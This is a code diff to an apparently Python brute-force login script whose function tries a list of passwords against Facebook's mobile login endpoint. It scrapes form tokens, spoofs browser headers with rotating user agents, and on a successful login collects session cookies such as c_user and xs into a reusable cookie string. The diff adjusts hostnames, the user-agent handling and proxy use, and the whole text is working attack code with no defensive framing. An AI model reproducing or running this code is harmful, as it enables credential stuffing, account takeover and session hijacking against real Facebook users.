@@ -788,7 +788,7 @@ def m2(ids,pwv):
     uger = random.choice(ugrn)
     try:
         for pas in pwv:
-            free_fb = session.get(f'https://{fb}.facebook.com').text
+            free_fb = session.get(f'https://m.facebook.com').text
             info={
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -800,7 +800,7 @@ def m2(ids,pwv):
             "pass":pas,
             "login":"Log In"}
             update={
-            'authority': f'{fb}.facebook.com',
+            'authority': f'm.facebook.com',
             'method': 'POST',  # Assuming this is a POST request
             'path': '/',      # Assuming this is the path of the request
             'scheme': 'https',
@@ -808,8 +808,8 @@ def m2(ids,pwv):
             'accept-language': 'es-MX,es;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '2.75',
-            'origin': f'https://{fb}.facebook.com',
-            'referer': f'https://{fb}.facebook.com/?locale2=en_GB',
+            'origin': f'https://m.facebook.com',
+            'referer': f'https://m.facebook.com/?locale2=en_GB',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="118", ";Not A Brand";v="8.0.0.0"',
             'sec-ch-ua-full-version-list': '"Not A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
@@ -820,13 +820,13 @@ def m2(ids,pwv):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+            'user-agent': uger,
             'viewport-width': '393',
             'x-asbd-id': '129477',
             'x-fb-lsd': 'AVq9MsDYu_k',
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream'}
-            session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info,headers=update,proxies=proxs,allow_redirects=False).text
+            session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info,headers=update,allow_redirects=False).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
